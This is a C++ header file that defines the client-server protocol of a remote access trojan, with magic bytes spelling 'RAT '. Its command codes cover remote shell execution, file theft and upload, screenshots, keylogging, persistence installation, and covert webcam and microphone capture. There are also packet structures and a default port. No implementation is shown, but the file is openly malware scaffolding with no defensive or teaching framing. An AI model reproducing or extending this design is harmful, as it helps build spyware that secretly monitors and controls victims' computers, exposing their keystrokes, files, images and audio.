#ifndef PROTOCOL_H
#define PROTOCOL_H

#include <cstdint>
#include <string>

// Command codes for client-server communication
enum CommandCode
{
    CMD_PING = 0x01,               // Check if client is alive
    CMD_SHELL_EXEC = 0x02,         // Execute shell command
    CMD_FILE_LIST = 0x03,          // List files in directory
    CMD_FILE_UPLOAD = 0x04,        // Upload file to client
    CMD_FILE_DOWNLOAD = 0x05,      // Download file from client
    CMD_SCREENSHOT = 0x06,         // Take screenshot
    CMD_KEYLOG_START = 0x07,       // Start keylogger
    CMD_KEYLOG_STOP = 0x08,        // Stop keylogger
    CMD_KEYLOG_DUMP = 0x09,        // Get keylogger data
    CMD_PERSISTENCE = 0x0A,        // Install persistence
    CMD_REMOVE_PERSISTENCE = 0x0B, // Remove persistence
    CMD_SYSTEM_INFO = 0x0C,        // Get system information
    CMD_PROCESS_LIST = 0x0D,       // List running processes
    CMD_PROCESS_KILL = 0x0E,       // Kill a process
    CMD_WEBCAM_CAPTURE = 0x0F,     // Capture image from webcam
    CMD_MIC_RECORD = 0x10,         // Record from microphone
    CMD_EXIT = 0xFF                // Exit client
};

// Packet header for all communications
struct PacketHeader
{
    uint32_t magic;          // Magic number (0x52415420 = "RAT ")
    uint16_t command;        // Command code
    uint32_t payload_length; // Length of following payload
    uint32_t sequence;       // Sequence number
    uint32_t checksum;       // CRC32 checksum of payload
};

// Response status codes
enum ResponseStatus
{
    STATUS_SUCCESS = 0,
    STATUS_ERROR_GENERAL = 1,
    STATUS_ERROR_NOT_IMPLEMENTED = 2,
    STATUS_ERROR_PERMISSION_DENIED = 3,
    STATUS_ERROR_NOT_FOUND = 4
};

// Response header
struct ResponseHeader
{
    uint16_t status;         // Response status code
    uint32_t payload_length; // Length of following payload
    uint32_t sequence;       // Matching sequence number from request
    uint32_t checksum;       // CRC32 checksum of payload
};

// Constants
const uint32_t PROTOCOL_MAGIC = 0x52415420; // "RAT "
const uint16_t DEFAULT_PORT = 8080;
const int MAX_PACKET_SIZE = 65536;

#endif // PROTOCOL_H